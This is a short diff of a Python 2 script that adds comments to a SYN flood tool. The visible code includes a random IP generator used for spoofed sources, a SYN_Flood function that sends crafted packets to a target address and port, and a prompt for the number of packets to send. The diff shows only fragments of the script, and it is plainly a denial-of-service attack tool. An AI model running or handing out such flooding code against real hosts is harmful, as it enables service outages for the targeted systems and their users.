@@ -8,6 +8,7 @@ import os
 import sys
 import random
 
+#makes a random ip
 def randomIP():
 	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
 	return ip
@@ -16,6 +17,8 @@ def randInt():
 	x = random.randint(1000,9000)
 	return x
 
+#consturcts a custum data packet with ramdom vaules
+#then send the packet to target
 def SYN_Flood(dstIP,dstPort,counter):
 	total = 0
 	print "Packets are sending ..."
@@ -53,7 +56,7 @@ def info():
 
 	return dstIP,int(dstPort)
 
-
+#control of code 
 def main():
 	dstIP,dstPort = info()
 	counter = input ("How many packets do you want to send : ")
